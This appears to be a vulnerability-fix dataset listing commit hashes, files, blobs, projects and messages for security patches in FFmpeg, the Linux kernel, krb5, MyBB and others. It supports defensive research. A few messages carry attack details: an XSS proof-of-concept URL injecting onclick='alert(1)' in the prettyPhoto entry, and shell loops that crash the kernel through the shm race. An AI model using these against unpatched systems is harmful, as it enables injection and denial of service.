    710cafd2e1a9f7a7308ffc4fa82a02abec431523
    73db48eba1c48faa046c584912f09cda8f6ae2fa
    7fa5cb609e7b2dcd934a6a2b3dceece83cdadf53
    93717435013e0a146c10bc8cf3ea4cbddb627f9b
    93718f3db79b3bcacd7bef609978175c68211db3
    b82bcde53f7a02ddceb2a015a7e54d2fc52373e7
    bff3d821c7ebb7cf7b05342a5e4a9b4ddb14cd4a
    c4ff5bbb45c44a1bda8eee4f5d7728338de88a47
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2:
net: fib: fib6_add: fix potential NULL pointer dereference\n\nWhen the kernel is compiled with CONFIG_IPV6_SUBTREES, and we return with an error in fn = fib6_add_1(), then error codes are encoded into the return pointer e.g. ERR_PTR(-ENOENT). In such an error case, we write the error code into err and jump to out, hence enter the if(err) condition. Now, if CONFIG_IPV6_SUBTREES is enabled, we check for:\n\n  if (pn != fn && pn->leaf == rt)     ...   if (pn != fn && !pn->leaf && !(pn->fn_flags & RTN_RTINFO))     ...\n\nSince pn is NULL and fn is f.e. ERR_PTR(-ENOENT), then pn != fn evaluates to true and causes a NULL-pointer dereference on further checks on pn. Fix it, by setting both NULL in error case, so that pn != fn already evaluates to false and no further dereference takes place.\n\nThis was first correctly implemented in 4a287eba2 ("IPv6 routing, NLM_F_* flag support: REPLACE and EXCL flags support, warn about missing CREATE flag"), but the bug got later on introduced by 188c517a0 ("ipv6: return errno pointers consistently for fib6_add_1()").\n\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Lin Ming <mlin@ss.pku.edu.cn> Cc: Matti Vaittinen <matti.vaittinen@nsn.com> Cc: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Matti Vaittinen <matti.vaittinen@nsn.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    cf970c002d270c36202bd5b9c2804d3097a52da0
File(s) In Commit: 
    net/ipv4/ping.c
Blob(s) In Commit: 
    91bfe0437e7a0123416103b95b274f7cd89aed02
Blob(s) Before Fix: 
    aacefa0caa36af726e848e9f590625ae310e6732
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cf970c002d270c36202bd5b9c2804d3097a52da0:
ping: prevent NULL pointer dereference on write to msg_name\n\nA plain read() on a socket does set msg->msg_name to NULL. So check for NULL pointer first.\n\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    f4d5cc8e1f39d132b61e110674528cac727ae0e2
File(s) In Commit: 
    templates/lxc-sshd.in
Blob(s) In Commit: 
    bbbea62f97063b917c87b39c67e5665b5f5d8c63
Blob(s) Before Fix: 
    b8df78f07622fb3c1dd18eaf568441e7fc09717a
Projects:
    0x0916_lxc
Commit Message for f4d5cc8e1f39d132b61e110674528cac727ae0e2:
sshd: Don't bind-mount /sbin/init read-write\n\nlxc-sshd was mounting itself (the template script) as /sbin/init in the container using a writable bind-mount.\n\nThis shouldn't be needed and could lead to quite a few problems should one of those containers overwrite /sbin/init for some reason.\n\nInstead simply move to a read-only bind-mount which should prevent any accidental dammage.\n\nSigned-off-by: Stéphane Graber <stgraber@ubuntu.com>

======================================================================
Commit With Fix: 
    4818204506e8e94645b52adb9426bedfa9ffdd04
File(s) In Commit: 
    jbpm-console-ng-human-tasks/jbpm-console-ng-human-tasks-client/src/main/java/org/jbpm/console/ng/ht/client/editors/taskdetailsmulti/TaskDetailsMultiPresenter.java
Blob(s) In Commit: 
    d52b0c287db1bd520c173a134b855e231361347a
Blob(s) Before Fix: 
    ac933cde563f2770a4baaf657a824bc8a1a7e602
Projects:
    Cory-jbpm_jbpm-wb
Commit Message for 4818204506e8e94645b52adb9426bedfa9ffdd04:
BZ-1049109: escaping task name html inputs

======================================================================
Commit With Fix: 
    3e88c98ca513880e2b43ed7f27ade17fef5d9170
File(s) In Commit: 
    security/MemberLoginForm.php
Blob(s) In Commit: 
    cb584539cc2465d0bfe583261851c5d314efd6c7
Blob(s) Before Fix: 
    1e5e2bceb982b24c435b64b44901cdbfeebcda40
    755006efc95127afcfd843717aa3b89be7114522
Projects:
    12345678--_silverstripe-framework
Commit Message for 3e88c98ca513880e2b43ed7f27ade17fef5d9170:
API Restrict MemberLoginForm to POST requests for increased security\n\nCVE-2013-2653 - Thanks to Fara Rustein of Deloitte Argentina for reporting.

======================================================================
Commit With Fix: 
    c2ccf4197f697c4ff143b8a786acdd875e70a89d
File(s) In Commit: 
    src/kdc/main.c
Blob(s) In Commit: 
    71606079659c1ae940d74770850e4ccfbc9d2f92
Blob(s) Before Fix: 
    b56ec193ca3fb0be4707b287e2d89ce94cbdd15f
Projects:
    3van_krb5
Commit Message for c2ccf4197f697c4ff143b8a786acdd875e70a89d:
Multi-realm KDC null deref [CVE-2013-1418]\n\nIf a KDC serves multiple realms, certain requests can cause setup_server_realm() to dereference a null pointer, crashing the KDC.\n\nCVSSv2: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C\n\nA related but more minor vulnerability requires authentication to exploit, and is only present if a third-party KDC database module can dereference a null pointer under certain conditions.\n\n(back ported from commit 5d2d9a1abe46a2c1a8614d4672d08d9d30a5f8bf)\n\nticket: 7757 (new) version_fixed: 1.10.7 status: resolved

======================================================================
Commit With Fix: 
    3ef0ddfefebbcc6bbe9245f9cea87e26838e9bbc
File(s) In Commit: 
    js/jquery.prettyPhoto.js
Blob(s) In Commit: 
    671db901eb7c0fc54f325fad4ca738070555f577
Blob(s) Before Fix: 
    89fe04de060f571384240061b9a8669c0d900d6b
Projects:
    19silly_prettyphoto
Commit Message for 3ef0ddfefebbcc6bbe9245f9cea87e26838e9bbc:
Update js/jquery.prettyPhoto.js\n\nEscape hashRel and parse hashIndex as integer.  Example: http://www.no-margin-for-errors.com/projects/prettyPhoto-jquery-lightbox-clone/#prettyPhoto[pp_gal]/2,<a onclick="alert(1) ">/

======================================================================
Commit With Fix: 
    29ffeef5e73b8f41ff3a3f2242d356759c66f91f
File(s) In Commit: 
    libavcodec/h264.c
Blob(s) In Commit: 
    66720571ab13b0589d22443546283dbbe7af0090
Blob(s) Before Fix: 
    68f51a99df442c5853dc02b1a52f3221506852b2
    6d7ac58b75ac9bc1338ee81c518cea1eeacd6895
Projects:
    00ERNEST00_FFmpeg
Commit Message for 29ffeef5e73b8f41ff3a3f2242d356759c66f91f:
avcodec/h264: do not trust last_pic_droppable when marking pictures as done\n\nThis simplifies the code and fixes a deadlock\n\nFixes Ticket2927 Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    3819db745da2ac7fb3faacb116788c32f4753f34
File(s) In Commit: 
    libavcodec/rpza.c
Blob(s) In Commit: 
    416f8b67228903c9d0aab77799f115f34721de28
Blob(s) Before Fix: 
    2aa0091d32699562883032f4787edc0b6b36951b
    45350a85d8e8905484c106905e1d014780886da6
    d4e2b17addf55d4091ff033aced9c2bc49f550dd
Projects:
    00ERNEST00_FFmpeg
Commit Message for 3819db745da2ac7fb3faacb116788c32f4753f34:
avcodec/rpza: Perform pointer advance and checks before using the pointers\n\nFixes out of array accesses Fixes Ticket2850\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    454a11a1c9c686c78aa97954306fb63453299760
File(s) In Commit: 
    libavcodec/dsputil.c
Blob(s) In Commit: 
    53fd5720cdbffd319357e31140e3157185267629
Blob(s) Before Fix: 
    0161347cc4e5f1a098238da93d82a24d0dcc29dd
    6d93706fb0d5dd631d132e4df157883a0aedaf34
    b434589fe008a18ee12a5ddbefbd20d0f5c47e45
Projects:
    00ERNEST00_FFmpeg
Commit Message for 454a11a1c9c686c78aa97954306fb63453299760:
avcodec/dsputil: fix signedness in sizeof() comparissions\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    547d690d676064069d44703a1917e0dab7e33445
File(s) In Commit: 
    libavcodec/ffv1dec.c
Blob(s) In Commit: 
    3081207a04929ba8f71d39576f5b9a8f24bae339
Blob(s) Before Fix: 
    499407ead24e71735b39c6ca76ecc88c142504ac
    76cbee7f23b0669e891d6c5be1156c980b407fdb
Projects:
    00ERNEST00_FFmpeg
Commit Message for 547d690d676064069d44703a1917e0dab7e33445:
ffv1dec: check that global parameters dont change in version 0/1\n\nSuch changes are not allowed nor supported\n\nFixes Ticket2906\n\nFound-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    780669ef7c23c00836a24921fcc6b03be2b8ca4a
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    b150bc1595045b4946b8f127905029ce34b721b3
Blob(s) Before Fix: 
    1eb20ac2ef2d29110138a9d398c84570fd5bee98
    26cacd5bba48dd89582f0bdc4c33277348a86f01
    2c00a694a4e022eb639b7c10ab1bae4bb7112a84
    4018dc904d4e05363f149149eccd0df350c1d95c
    80bc335507fbeaa7b0a0cc7280b9de8bfadbc580
    8c0e6ffd66e953c9792dc93aba1a363a61297e7f
    cc154c3522dc1f335f163880448dcfe0ca58da15
Projects:
    00ERNEST00_FFmpeg
Commit Message for 780669ef7c23c00836a24921fcc6b03be2b8ca4a:
avcodec/jpeg2000dec: non zero image offsets are not supported\n\nFixes out of array accesses Fixes Ticket3080 Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    821a5938d100458f4d09d634041b05c860554ce0
File(s) In Commit: 
    libavcodec/g2meet.c
Blob(s) In Commit: 
    ccccf218346dfeec6e5773d2ba57303cc7638cba
Blob(s) Before Fix: 
    1bbac2d8683ed8d43bd906d978dda9d2237252f4
    3e81541e68283c5857acb066b2c10328775abbdf
    99d4d1ec37b266dce2bf68bc0a4169e346885d4d
    9a228b8873fbcfb83c41bc4164c33f4d274d98e8
Projects:
    00ERNEST00_FFmpeg
Commit Message for 821a5938d100458f4d09d634041b05c860554ce0:
avcodec/g2meet: Fix order of align and pixel size multiplication.\n\nFixes out of array accesses Fixes Ticket2922\n\nFound-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    86736f59d6a527d8bc807d09b93f971c0fe0bb07
File(s) In Commit: 
    libavcodec/pngdsp.c
Blob(s) In Commit: 
    5ab1c351b25374d4aacf9447691f134038290341
Blob(s) Before Fix: 
    0d247759cc0a393593dac19a41d6454847459f9e
    1ee8b57bc95e47ae3fbf9c71dda9742e311fbbe3
    38ee458f8d3c34114857f2c9ce6582e171db39ed
    5cc41c4e800f31050fa36464569db2fa48031959
    75ec996ca13447efa6a8705ef663780e79e37f65
    afd90931743a34ed3a60dbcff1ed327adf073520
    d2753163dad49d5efc0545cd0129651f0ebc4db8
Projects:
    00ERNEST00_FFmpeg
Commit Message for 86736f59d6a527d8bc807d09b93f971c0fe0bb07:
avcodec/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses Fixes Ticket2919\n\nFound_by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    880c73cd76109697447fbfbaa8e5ee5683309446
File(s) In Commit: 
    libavcodec/flashsv.c
Blob(s) In Commit: 
    f00bf21d4721f1a15d73c3fdb5f44414f4a52d3f
Blob(s) Before Fix: 
    2fbe221bfa0eacd8d44be9cb01a5fa575eb9741d
    533e9f0f37a9b13acc75bd8fa88f7ba4e5fb8893
    65b9da42dd6abc1db9f966157d9fe443135689bd
    9982b5e96637e78ea568bd8af86fd123c2ee99cd
Projects:
    00ERNEST00_FFmpeg
Commit Message for 880c73cd76109697447fbfbaa8e5ee5683309446:
avcodec/flashsv: check diff_start/height\n\nFixes out of array accesses Fixes Ticket2844\n\nFound-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    8bb11c3ca77b52e05a9ed1496a65f8a76e6e2d8f
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    34ac5360560322c3f42625ab1f426c487a13dfc3
Blob(s) Before Fix: 
    3c14a13f8ed46dd9c141ae99e4002f2a8dfff8bb
Projects:
    00ERNEST00_FFmpeg
Commit Message for 8bb11c3ca77b52e05a9ed1496a65f8a76e6e2d8f:
avcodec/jpeg2000dec: Check cdx/y values more carefully\n\nSome invalid values where not handled correctly in the later pixel format matching code. Fixes out of array accesses Fixes Ticket2848\n\nFound-by: Piotr Bandurski <ami_stuff@o2.pl> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    912ce9dd2080c5837285a471d750fa311e09b555
File(s) In Commit: 
    libavcodec/jpeg2000.c
Blob(s) In Commit: 
    dc3311052ee2f237020e2c97f7eead9b15a4d9e8
Blob(s) Before Fix: 
    cb1a64d14326bf1b2626ef678fdd16f16cc89e26
    f3658c2c8404640c500173003a0ebe718d8af392
Projects:
    00ERNEST00_FFmpeg
Commit Message for 912ce9dd2080c5837285a471d750fa311e09b555:
jpeg2000: fix dereferencing invalid pointers\n\nFound-by: Laurent Butti <laurentb@gmail.com> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    9a271a9368eaabf99e6c2046103acb33957e63b7
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    8c0e6ffd66e953c9792dc93aba1a363a61297e7f
Blob(s) Before Fix: 
    1eb20ac2ef2d29110138a9d398c84570fd5bee98
    34ac5360560322c3f42625ab1f426c487a13dfc3
    61befdfae25f1554b82d25bfba62398364d297e8
    fb4e52b238f7766e79cb5067b61c9fa847ed66c6
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9a271a9368eaabf99e6c2046103acb33957e63b7:
jpeg2000: check log2_cblk dimensions\n\nFixes out of array access Fixes Ticket2895\n\nFound-by: Piotr Bandurski <ami_stuff@o2.pl> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    a1b9004b768bef606ee98d417bceb9392ceb788d
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    80bc335507fbeaa7b0a0cc7280b9de8bfadbc580
Blob(s) Before Fix: 
    20e5c9cc93d894f608b4894885ebab0d6b0651de
    2a71d1dc1993b7d276e4456ba5ccac87c246cfb4
    3c14a13f8ed46dd9c141ae99e4002f2a8dfff8bb
    9fc86d6e82ef350668d83c2b658bf7195504fa8b
    cc154c3522dc1f335f163880448dcfe0ca58da15
    ef63d37f0c63864330b8c4963b2332769b7a31f9
Projects:
    00ERNEST00_FFmpeg
Commit Message for a1b9004b768bef606ee98d417bceb9392ceb788d:
avcodec/jpeg2000dec: fix context consistency with too large lowres\n\nFixes out of array accesses Fixes Ticket2898\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    b05cd1ea7e45a836f7f6071a716c38bb30326e0f
File(s) In Commit: 
    libavcodec/ffv1dec.c
Blob(s) In Commit: 
    38e0849d87dc822baefb95e18a8b881836c32529
Blob(s) Before Fix: 
    17b894645fec15bdd0d9ab78065d23b718dfec02
    3081207a04929ba8f71d39576f5b9a8f24bae339
    499407ead24e71735b39c6ca76ecc88c142504ac
    fba01b9d372c1618fce56048adfe9204213c9c3d
Projects:
    00ERNEST00_FFmpeg
Commit Message for b05cd1ea7e45a836f7f6071a716c38bb30326e0f:
ffv1dec: Check bits_per_raw_sample and colorspace for equality in ver 0/1 headers\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    cdd5df8189ff1537f7abe8defe971f80602cc2d2
File(s) In Commit: 
    libavfilter/vf_fps.c
Blob(s) In Commit: 
    06ebdfadce66425c7b2b430fcb020bf382dba29e
Blob(s) Before Fix: 
    006c24577f07cee9a774f4fdfd19e04ef4b368a1
    4eb3663b1a4506a9a904dca959c5542e34968d88
    5b2818529a8f8f0947ba1330ee5f964a40a998bd
    ec77ccf722b8e92ecbf1f806c205dd3002aae387
Projects:
    00ERNEST00_FFmpeg
Commit Message for cdd5df8189ff1537f7abe8defe971f80602cc2d2:
avfilter/vf_fps: make sure the fifo is not empty before using it\n\nFixes Ticket2905\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    e07ac727c1cc9eed39e7f9117c97006f719864bd
File(s) In Commit: 
    libavcodec/g2meet.c
Blob(s) In Commit: 
    1eae1a49b5dae63e35bbd232b689b2ed25f54f81
Blob(s) Before Fix: 
    1bbac2d8683ed8d43bd906d978dda9d2237252f4
    99d4d1ec37b266dce2bf68bc0a4169e346885d4d
    ccccf218346dfeec6e5773d2ba57303cc7638cba
Projects:
    00ERNEST00_FFmpeg
Commit Message for e07ac727c1cc9eed39e7f9117c97006f719864bd:
avcodec/g2meet: Fix framebuf size\n\nCurrently the code can in some cases draw tiles that hang outside the allocated buffer. This patch increases the buffer size to avoid out of array accesses. An alternative would be to fail if such tiles are encountered. I do not know if any valid files use such hanging tiles.\n\nFixes Ticket2971 Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    f31011e9abfb2ae75bb32bc44e2c34194c8dc40a
File(s) In Commit: 
    libavcodec/parser.c
Blob(s) In Commit: 
    8a825938a6518deceadbeecd0b3cb41e24e173d5
Blob(s) Before Fix: 
    2e204e2c2a6ad65afd0c06b2a01597efdc1b7aee
    3169e2501f9188b397f5db41d84b45d627543fb1
    500bbb8f5438e7315d725771edd9f0f8f3dd262d
    58be89f349f44eac783b925a35a301b9b3cb45b4
    6e755f6b75c0d9f73a5eb0bb18c2bfc6bcfaf997
    f7cb5cfa67e2ed2b9ad4c12a9fe15d5cf3ee1bfa
Projects:
    00ERNEST00_FFmpeg
Commit Message for f31011e9abfb2ae75bb32bc44e2c34194c8dc40a:
avcodec/parser: reset indexes on realloc failure\n\nFixes Ticket2982\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    fe448cd28d674c3eff3072552eae366d0b659ce9
File(s) In Commit: 
    libavcodec/jpeg2000dec.c
Blob(s) In Commit: 
    ef63d37f0c63864330b8c4963b2332769b7a31f9
Blob(s) Before Fix: 
    26cacd5bba48dd89582f0bdc4c33277348a86f01
    aae369787fd7daf691ba5e348272460adfa88c61
    caa5ae4e91d3edb0d39eb6b70410423f4a53aa69
    cbba2d02d833fc10bf87d3c7611f6ac781851792
Projects:
    00ERNEST00_FFmpeg
Commit Message for fe448cd28d674c3eff3072552eae366d0b659ce9:
avcodec/jpeg2000dec: prevent out of array accesses in pixel addressing\n\nFixes Ticket2921\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    a399b29dfbaaaf91162b2dc5a5875dd51bbfa2a1
File(s) In Commit: 
    ipc/shm.c
Blob(s) In Commit: 
    0bdf21c6814ef8118be3ae56196b85f11b7b3ac2
Blob(s) Before Fix: 
    d69739610fd4384323004c46782116d54db6bbd5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a399b29dfbaaaf91162b2dc5a5875dd51bbfa2a1:
ipc,shm: fix shm_file deletion races\n\nWhen IPC_RMID races with other shm operations there's potential for use-after-free of the shm object's associated file (shm_file).\n\nHere's the race before this patch:\n\n  TASK 1                     TASK 2   ------                     ------   shm_rmid()     ipc_lock_object()                              shmctl()                              shp = shm_obtain_object_check()\n\n    shm_destroy()       shum_unlock()       fput(shp->shm_file)                              ipc_lock_object()                              shmem_lock(shp->shm_file)                              <OOPS>\n\nThe oops is caused because shm_destroy() calls fput() after dropping the ipc_lock.  fput() clears the file's f_inode, f_path.dentry, and f_path.mnt, which causes various NULL pointer references in task 2.  I reliably see the oops in task 2 if with shmlock, shmu\n\nThis patch fixes the races by: 1) set shm_file=NULL in shm_destroy() while holding ipc_object_lock(). 2) modify at risk operations to check shm_file while holding    ipc_object_lock().\n\nExample workloads, which each trigger oops...\n\nWorkload 1:   while true  do     id=$(shmget 1 4096)     shm_rmid $id &     shmlock $id &     wait   done\n\n  The oops stack shows accessing NULL f_inode due to racing fput:     _raw_spin_lock     shmem_lock     SyS_shmctl\n\nWorkload 2:   while true  do     id=$(shmget 1 4096)     shmat $id 4096 &     shm_rmid $id &     wait   done\n\n  The oops stack is similar to workload 1 due to NULL f_inode:     touch_atime     shmem_mmap     shm_mmap     mmap_region     do_mmap_pgoff     do_shmat     SyS_shmat\n\nWorkload 3:   while true  do     id=$(shmget 1 4096)     shmlock $id     shm_rmid $id &     shmunlock $id &     wait   done\n\n  The oops stack shows second fput tripping on an NULL f_inode.  The   first fput() completed via from shm_destroy(), but a racing thread did   a get_file() and queued this fput():     locks_remove_flock     __fput     ____fput     task_work_run     do_notify_resume     int_signal\n\nFixes: c2c737a0461e ("ipc,shm: shorten critical region for shmat") Fixes: 2caacaa82a51 ("ipc,shm: shorten critical region for shmctl") Signed-off-by: Greg Thelen <gthelen@google.com> Cc: Davidlohr Bueso <davidlohr@hp.com> Cc: Rik van Riel <riel@redhat.com> Cc: Manfred Spraul <manfred@colorfullife.com> Cc: <stable@vger.kernel.org>  # 3.10.17+ 3.11.6+ Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    f5563318ff1bde15b10e736e97ffce13be08bc1a
File(s) In Commit: 
    net/wireless/radiotap.c
Blob(s) In Commit: 
    a271c27fac774ce987c0db6f1330ffbfca6dc7f7
Blob(s) Before Fix: 
    722da616438cd1e933fb4d5e60a2c4846f44d186
    7d604c06c3dc38d1155366a52f184971be1197e3
    c4ad7958af52e84754b073915d009531299b9864
    dbe35e138e945f1bfc63aae4fdcb3a0c1e371b0b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f5563318ff1bde15b10e736e97ffce13be08bc1a:
wireless: radiotap: fix parsing buffer overrun\n\nWhen parsing an invalid radiotap header, the parser can overrun the buffer that is passed in because it doesn't correctly check  1) the minimum radiotap header size  2) the space for extended bitmaps\n\nThe first issue doesn't affect any in-kernel user as they all check the minimum size before calling the radiotap function. The second issue could potentially affect the kernel if an skb is passed in that consists only of the radiotap header with a lot of extended bitmaps that extend past the SKB. In that case a read-only buffer overrun by at most 4 bytes is possible.\n\nFix this by adding the appropriate checks to the parser.\n\nCc: stable@vger.kernel.org Reported-by: Evan Huus <eapache@gmail.com> Signed-off-by: Johannes Berg <johannes.berg@intel.com>

======================================================================
Commit With Fix: 
    a7fedbb36388bad0c0f32b2346481e0ea126dea6
File(s) In Commit: 
    app/controllers/application_controller.rb
Blob(s) In Commit: 
    7d4f3308736d6e2637378b50a46eab1d66e56372
Blob(s) Before Fix: 
    f64d6a6d932392c3f26e03386e5473a745a045f0
Projects:
    0bserver07_fat_free_crm
Commit Message for a7fedbb36388bad0c0f32b2346481e0ea126dea6:
Ensure requests are protected.

======================================================================
Commit With Fix: 
    3a10f6b829297dae63492a8c63385044bc6953ed
File(s) In Commit: 
    mappostgis.c
Blob(s) In Commit: 
    f24d9697a3447c78dc90d6fef84f3ad9bf21d43f
Blob(s) Before Fix: 
    1f4c64eba1674e0082cffcf1bfdae30f9d29da9b
Projects:
    3x0dv5_mapserver
Commit Message for 3a10f6b829297dae63492a8c63385044bc6953ed:
Fix potential SQL Injection with postgis TIME filters (#4834)

======================================================================
Commit With Fix: 
    6212bc954d72caf591e141ca36b8df964387bee8
File(s) In Commit: 
    misc.php
Blob(s) In Commit: 
    c00dd9f3cb9c6b1d58b7da4c4fd9c9e560c3633e
Blob(s) Before Fix: 
    98dfc7ee1947c3db27ecf4f5e2ccad7cf69a41a4
    d8745b79856c3fae5bcd47912fbb195288d465f3
    eff5be2d10cb0f4b2b10235530e9ac3b3452455c
Projects:
    00zh_mybb
Commit Message for 6212bc954d72caf591e141ca36b8df964387bee8:
Fixes XSS in misc.php

======================================================================
Commit With Fix: 
    238696e37d6a22b89e6bba11e4de3e6620cb5547
File(s) In Commit: 
    inc/class_parser.php
Blob(s) In Commit: 
    3e8ffcdddb18c0d6db2caa2768421747c4c878e2
Blob(s) Before Fix: 
    2df3abc8fa5614561c4d1f6943bfd09cf4b39668
    4af32cd4bf4af703c6a90113bb39235a920be642
    7ab6cd65f0ceb79a886aab342ba4a51997101774
    e05d8eac44ac3a81ff83090cae2be5075d43ffbb
Projects:
    00zh_mybb
Commit Message for 238696e37d6a22b89e6bba11e4de3e6620cb5547:
Fixes XSS in inc/class_parser.php

======================================================================
Commit With Fix: 
    2899351224fe2940aec37d7656e1e392c0fe07f0
File(s) In Commit: 
    programs/pluto/ikev2_parent.c
Blob(s) In Commit: 
    ce67cc3c030a9316ef4281028aeb4e80598d2155
Blob(s) Before Fix: 
    72526ba03928b0986ae2e8e89b9c73ab30786910
Projects:
    123kayi_libreswan
Commit Message for 2899351224fe2940aec37d7656e1e392c0fe07f0:
SECURITY: Properly handle IKEv2 I1 notification packet without KE payload

======================================================================
Commit With Fix: 
    9bd3b14042e12d84f39ea9f55731705ba516f525
File(s) In Commit: 
    framework/common/messageheaderparser.cpp
Blob(s) In Commit: 
    7bb5d6c29616aa3ec61be137fa7ea04ec042f71b
Blob(s) Before Fix: 
    0c74c705252cf0f100fbd28ae45e99326eadeaad
Projects:
    42ity_tntnet
Commit Message for 9bd3b14042e12d84f39ea9f55731705ba516f525:
fix possible information leak

======================================================================
Commit With Fix: 
    c2349758acf1874e4c2b93fe41d072336f1a31d0
File(s) In Commit: 
    net/rds/ib.c
Blob(s) In Commit: 
    ba2dffeff60876ca669993d1863dcbb6cb76a740
Blob(s) Before Fix: 
    16d64f4c79ea46048323d2abf66291fb2ea114a8
    2d3f2ab475df8dc0b4329ca79ae59285f60df136
    3b83086bcc3045a2231dab3d84753dd0af7bed51
    4123967d4d651e77e4ca59cf1794fcff207d4847
    5018f3d10aae8f21a415132fd6a12c94f0003f19
    536ebe5d3f6bc1003a8fa7beef137345d7dea0a3
    5542d91ee7747881b9c00c5933ded9cfb32e6c37
    5680d90b0b779ec41d019f1d0797dca7b5072ece
    7533954acbf0c154a301db04644a27ee0adfeeb2
    7a64c8db81abdca2048d24380e3441dd50f12b90
    b4c8b0022feeebea1aec424542e37a8391d87297
    b6ad38e48f62692fa9dc6cc9f7c7081c706394a7
    f222885ac0c7397ed08c26106e68157d91267ff6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c2349758acf1874e4c2b93fe41d072336f1a31d0:
rds: prevent dereference of a NULL device\n\nBinding might result in a NULL device, which is dereferenced causing this BUG:\n\n[ 1317.260548] BUG: unable to handle kernel NULL pointer dereference at 000000000000097 4 [ 1317.261847] IP: [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110 [ 1317.263315] PGD 418bcb067 PUD 3ceb21067 PMD 0 [ 1317.263502] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC [ 1317.264179] Dumping ftrace buffer: [ 1317.264774]    (ftrace buffer empty) [ 1317.265220] Modules linked in: [ 1317.265824] CPU: 4 PID: 836 Comm: trinity-child46 Tainted: G        W    3.13.0-rc4- next-20131218-sasha-00013-g2cebb9b-dirty #4159 [ 1317.267415] task: ffff8803ddf33000 ti: ffff8803cd31a000 task.ti: ffff8803cd31a000 [ 1317.268399] RIP: 0010:[<ffffffff84225f52>]  [<ffffffff84225f52>] rds_ib_laddr_check+ 0x82/0x110 [ 1317.269670] RSP: 0000:ffff8803cd31bdf8  EFLAGS: 00010246 [ 1317.270230] RAX: 0000000000000000 RBX: ffff88020b0dd388 RCX: 0000000000000000 [ 1317.270230] RDX: ffffffff8439822e RSI: 00000000000c000a RDI: 0000000000000286 [ 1317.270230] RBP: ffff8803cd31be38 R08: 0000000000000000 R09: 0000000000000000 [ 1317.270230] R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000000 [ 1317.270230] R13: 0000000054086700 R14: 0000000000a25de0 R15: 0000000000000031 [ 1317.270230] FS:  00007ff40251d700(0000) GS:ffff88022e200000(0000) knlGS:000000000000 0000 [ 1317.270230] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [ 1317.270230] CR2: 0000000000000974 CR3: 00000003cd478000 CR4: 00000000000006e0 [ 1317.270230] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [ 1317.270230] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000090602 [ 1317.270230] Stack: [ 1317.270230]  0000000054086700 5408670000a25de0 5408670000000002 0000000000000000 [ 1317.270230]  ffffffff84223542 00000000ea54c767 0000000000000000 ffffffff86d26160 [ 1317.270230]  ffff8803cd31be68 ffffffff84223556 ffff8803cd31beb8 ffff8800c6765280 [ 1317.270230] Call Trace: [ 1317.270230]  [<ffffffff84223542>] ? rds_trans_get_preferred+0x42/0xa0 [ 1317.270230]  [<ffffffff84223556>] rds_trans_get_preferred+0x56/0xa0 [ 1317.270230]  [<ffffffff8421c9c3>] rds_bind+0x73/0xf0 [ 1317.270230]  [<ffffffff83e4ce62>] SYSC_bind+0x92/0xf0 [ 1317.270230]  [<ffffffff812493f8>] ? context_tracking_user_exit+0xb8/0x1d0 [ 1317.270230]  [<ffffffff8119313d>] ? trace_hardirqs_on+0xd/0x10 [ 1317.270230]  [<ffffffff8107a852>] ? syscall_trace_enter+0x32/0x290 [ 1317.270230]  [<ffffffff83e4cece>] SyS_bind+0xe/0x10 [ 1317.270230]  [<ffffffff843a6ad0>] tracesys+0xdd/0xe2 